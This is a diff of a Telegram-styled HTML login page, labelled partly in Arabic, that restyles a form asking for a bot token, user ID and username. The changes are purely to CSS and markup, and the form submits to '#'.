@@ -3,186 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إعدادات البوت - تصميم احترافي</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Telegram Bot Login - Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #0f1621;
-            --card-bg: #1c242d;
-            --primary-blue: #3390ec;
-            --primary-hover: #2a7cbd;
-            --text-main: #ffffff;
-            --text-muted: #7f8b9c;
-            --border-color: #2b3643;
-        }
-
-        * {
+        /* إعدادات الخلفية المتحركة بحال تيليجرام */
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Tajawal', sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(-45deg, #0e1621, #17212b, #2a5b84, #1a3652);
+            background-size: 400% 400%;
+            animation: gradientBG 12s ease infinite;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: var(--text-main);
+            color: #fff;
+            overflow: hidden;
         }
 
-        .login-container {
-            background-color: var(--card-bg);
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+            }
+
+        /* حاوية الزجاج (Glassmorphism) */
+        .glass-panel {
+            background: rgba(23, 33, 43, 0.65);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
             width: 100%;
-            max-width: 420px;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            animation: fadeIn 0.5s ease-out;
+            max-width: 400px;
+            padding: 40px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideUp {
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        .logo-circle {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #3390ec, #1c7cd6);
+        /* اللوجو */
+        .icon-container {
+            width: 85px;
+            height: 85px;
+            background: #3390ec;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
             margin: 0 auto 20px;
-            box-shadow: 0 4px 15px rgba(51, 144, 236, 0.4);
+            box-shadow: 0 8px 25px rgba(51, 144, 236, 0.4);
+            transition: transform 0.3s ease;
         }
 
-        .logo-circle svg {
-            width: 40px;
-            height: 40px;
+        .icon-container:hover {
+            transform: scale(1.05) rotate(5deg);
+        }
+
+        .icon-container svg {
+            width: 45px;
+            height: 45px;
             fill: white;
             margin-right: 5px;
         }
 
-        h2 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 700;
+        h1 {
+            text-align: center;
+            font-size: 26px;
+            margin: 0 0 10px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
         }
 
-        p.subtitle {
-            color: var(--text-muted);
+        p.desc {
+            text-align: center;
+            color: #8a9ba8;
             font-size: 14px;
-            margin-bottom: 30px;
+            margin-bottom: 35px;
+            line-height: 1.5;
         }
 
-        .input-group {
+        /* حقول الإدخال الاحترافية */
+        .form-group {
             position: relative;
-            margin-bottom: 25px;
-            text-align: right;
+            margin-bottom: 24px;
         }
 
-        .input-group input {
+        .form-group input {
             width: 100%;
-            background: transparent;
-            border: 2px solid var(--border-color);
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
-            padding: 16px;
-            color: var(--text-main);
+            padding: 18px 16px;
+            color: #fff;
             font-size: 16px;
             outline: none;
+            box-sizing: border-box;
             transition: all 0.3s ease;
-            direction: ltr;
+            direction: ltr; /* للكتابة الصحيحة باللغة الإنجليزية */
         }
 
-        .input-group label {
+        .form-group label {
             position: absolute;
             right: 16px;
             top: 50%;
             transform: translateY(-50%);
-            color: var(--text-muted);
+            color: #8a9ba8;
             font-size: 16px;
             pointer-events: none;
-            transition: all 0.3s ease;
-            background-color: var(--card-bg);
-            padding: 0 5px;
+            transition: 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
         }
 
-        /* تأثيرات عند الكتابة أو التركيز */
-        .input-group input:focus,
-        .input-group input:not(:placeholder-shown) {
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 0 4px rgba(51, 144, 236, 0.1);
+        /* تأثيرات التركيز (Focus) */
+        .form-group input:focus,
+        .form-group input:not(:placeholder-shown) {
+            border-color: #3390ec;
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 0 4px rgba(51, 144, 236, 0.15);
         }
 
-        .input-group input:focus ~ label,
-        .input-group input:not(:placeholder-shown) ~ label {
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
             top: 0;
-            font-size: 13px;
-            color: var(--primary-blue);
+            right: 12px;
+            transform: translateY(-50%) scale(0.85);
+            background: #1a2530; /* لون يغطي الخط */
+            padding: 0 6px;
+            color: #3390ec;
+            font-weight: 600;
         }
 
-        .submit-btn {
+        /* زر الإرسال */
+        .btn-submit {
             width: 100%;
-            background-color: var(--primary-blue);
+            background: #3390ec;
             color: white;
             border: none;
             padding: 16px;
             border-radius: 12px;
             font-size: 18px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
+            margin-top: 10px;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(51, 144, 236, 0.3);
+            position: relative;
+            overflow: hidden;
         }
 
-        .submit-btn:hover {
-            background-color: var(--primary-hover);
+        .btn-submit:hover {
+            background: #2b7cb9;
+            box-shadow: 0 8px 20px rgba(51, 144, 236, 0.4);
             transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(51, 144, 236, 0.4);
         }
 
-        .submit-btn:active {
+        .btn-submit:active {
             transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(51, 144, 236, 0.3);
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- لوجو تيليجرام -->
-        <div class="logo-circle">
+    <div class="glass-panel">
+        
+        <div class="icon-container">
+            <!-- أيقونة تيليجرام أصلية SVG -->
             <svg viewBox="0 0 24 24">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.19-.08-.05-.19-.02-.27 0-.12.03-1.98 1.25-5.58 3.69-.53.36-1.01.53-1.44.52-.47-.01-1.38-.27-2.06-.49-.83-.27-1.49-.42-1.43-.89.03-.25.38-.51 1.03-.78 4.04-1.76 6.74-2.92 8.09-3.48 3.85-1.6 4.64-1.88 5.17-1.89.12 0 .37.03.51.14.11.09.15.22.16.35-.01.07-.01.19-.03.32z"/>
             </svg>
         </div>
 
-        <h2>إعدادات البوت</h2>
-        <p class="subtitle">قم بإدخال معلومات البوت الخاصة بك للاتصال</p>
+        <h1>إعدادات النظام</h1>
+        <p class="desc">المرجو إدخال معلومات البوت الخاص بك للاتصال الآمن بالخوادم.</p>
 
         <form action="#" method="POST">
             
-            <div class="input-group">
-                <input type="text" id="bot_token" name="bot_token" placeholder=" " required>
-                <label for="bot_token">رمز البوت (Bot Token)</label>
+            <div class="form-group">
+                <input type="text" name="bot_token" id="bot_token" placeholder=" " required autocomplete="off">
+                <label for="bot_token">Bot Token (رمز البوت)</label>
             </div>
 
-            <div class="input-group">
-                <input type="number" id="user_id" name="user_id" placeholder=" " required>
-                <label for="user_id">رقم المعرف (ID)</label>
+            <div class="form-group">
+                <input type="number" name="user_id" id="user_id" placeholder=" " required autocomplete="off">
+                <label for="user_id">User ID (المعرف)</label>
             </div>
 
-            <div class="input-group">
-                <input type="text" id="username" name="username" placeholder=" " required>
-                <label for="username">اسم المستخدم (Username)</label>
+            <div class="form-group">
+                <input type="text" name="username" id="username" placeholder=" " required autocomplete="off">
+                <label for="username">Username (اسم المستخدم)</label>
             </div>
 
-            <button type="submit" class="submit-btn">تسجيل الدخول</button>
+            <button type="submit" class="btn-submit">تسجيل الدخول</button>
             
         </form>
+
     </div>
 
 </body>
